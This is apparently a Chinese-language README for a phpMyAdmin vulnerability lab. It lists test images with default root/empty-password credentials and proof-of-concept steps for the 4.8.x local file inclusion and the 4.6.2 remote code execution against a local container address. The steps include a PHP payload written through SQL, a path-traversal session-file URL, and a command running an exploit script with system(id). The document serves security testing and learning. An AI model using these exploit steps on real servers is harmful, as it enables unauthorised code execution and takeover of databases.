## 环境说明

* src/phpmyadmin/3.5.6/

  - 数据库账号

    无认证

* src/phpmyadmin/4.8.1

  * 数据库账号

    root / 空密码

* src/phpmyadmin/4.4.15.6

  * 数据库账号

    root / 空密码


## phpMyAdmin 4.8.x 文件包含漏洞

测试镜像

- src/phpmyadmin/4.8.1

影响版本

- phpmyadmin  4.8.x

参考链接

- [phpMyAdmin 4.8.x（最新版） 本地文件包含漏洞利用](https://bbs.pediy.com/thread-228693.htm)

Poc

1、使用帐号root登录 phpMyAdmin

2、执行SQL查询

`select '<?php phpinfo();exit();?>'`

3、Cookie 中的 phpMyAdmin项为当前用户SESSION ID，获取后，访问url

```
http://172.17.0.2/index.php?target=db_sql.php%253f/../../../../../../../../opt/remi/php56/root/var/lib/php/session/sess_当前用户sessionID
```

完成包含利用



## phpMyAdmin 4.6.2 远程代码执行漏洞

测试镜像

- src/phpmyadmin/4.4.15.6

影响版本

- phpmyadmin <= 4.0.10.15
- phpmyadmin <= 4.4.15.6
- phpmyadmin <=4.6.2

特殊要求

- php <= 5.3

参考链接

* [phpMyAdmin 4.x Remote Code Execution](https://packetstormsecurity.com/files/148222)

Poc

使用phpmyadmin/4.4.15.6/CVE-2016-5734.py

```shell
python CVE-2016-5734.py -c "system(id)" -u root -p "" -d test http://172.17.0.2/
```

